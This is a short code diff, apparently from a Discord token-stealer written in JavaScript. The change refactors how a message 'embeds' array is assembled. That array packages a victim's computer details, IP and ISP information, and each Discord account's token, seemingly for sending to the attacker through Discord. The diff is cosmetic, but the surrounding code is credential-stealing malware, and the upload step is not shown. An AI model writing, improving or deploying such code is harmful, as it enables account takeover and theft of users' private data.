@@ -30,13 +30,12 @@ const json = async (zipFile) => {
     ['ISP', code(await ipInfo('isp'))],
   ];
 
-  const embeds = [
-    {
-      description:
-        computerInfoFields.map(i => `**${i[0]}:** ${i[1]}`).join('\n') + '\n\n' +
-        ipInfoFields.map(i => `**${i[0]}:** ${i[1]}`).join('\n')
-    },
-  ];
+  const embeds = [];
+  embeds.push({
+    description:
+      computerInfoFields.map(i => `**${i[0]}:** ${i[1]}`).join('\n') + '\n\n' +
+      ipInfoFields.map(i => `**${i[0]}:** ${i[1]}`).join('\n')
+  });
   discordAccountInfo.accounts.forEach(account => { embeds.push({
     description: `Token: ${codeBlock(account.token)}`,
     author: {
